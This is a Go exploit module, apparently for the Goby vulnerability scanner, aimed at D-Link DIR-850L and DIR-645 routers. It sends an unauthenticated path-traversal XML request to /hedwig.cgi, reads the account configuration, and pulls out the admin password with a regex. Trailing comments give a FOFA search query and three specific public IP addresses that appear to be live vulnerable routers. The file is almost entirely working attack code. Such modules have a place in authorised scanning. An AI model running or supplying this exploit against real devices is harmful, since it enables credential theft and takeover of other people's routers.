package exploits

import (
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "D-Link 850L and 645 Information Disclosure",
    "Description": "This module leverages an unauthenticated credential disclosure vulnerability  on DIR-850L routers .",
    "Product": "D-Link",
    "Homepage": "http://www.dlink.co.in/",
    "DisclosureDate": "2021-05-31",
    "Author": "李大壮",
    "FofaQuery": "body=\"DIR-850L\" || body=\"DIR645\"",
    "Level": "3",
    "Impact": "<p>Its More Dangerous when your Router has a public IP with remote login enabled.</p>",
    "Recommendation": "<p>Update Patches</p>",
    "References": [
        "https://xz.aliyun.com/t/2941"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "Information Disclosure"
    ],
    "CVEIDs": null,
    "CVSSScore": "9.3",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "D-Link-DIR_850"
        ]
    },
    "GobyQuery": "body=\"DIR-850L\" || body=\"DIR645\"",
    "PocId": "10208"
}`

	ExpManager.AddExploit(NewExploit( //nolint
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/hedwig.cgi")
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "text/xml")
			cfg.Header.Store("Cookie", "uid=R8tBjwtFc8")
			cfg.Data = "<?xml version=\"1.0\" encoding=\"utf-8\"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>"
			resp, err := httpclient.DoHttpRequest(u, cfg)

			if err == nil && strings.Contains(resp.RawBody, "<name>Admin</name>") {
				return true
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/hedwig.cgi")
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "text/xml")
			cfg.Header.Store("Cookie", "uid=R8tBjwtFc8")
			cfg.Data = "<?xml version=\"1.0\" encoding=\"utf-8\"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>"
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err == nil && strings.Contains(resp.RawBody, "<name>Admin</name>") {
				pwd := regexp.MustCompile(`<password>(.*?)</password>`).FindStringSubmatch(resp.RawBody)
				if len(pwd) != 0 {
					expResult.Success = true
					expResult.Output = "UserName: Admin\nPassword: " + pwd[1]
				}
			}

			return expResult
		},
	))
}

// fofa app="D_Link-850L" || app="D_Link-DIR-645"
// http://1.238.109.222:8080/
// http://1.65.174.39:8080/
// http://111.185.168.72/
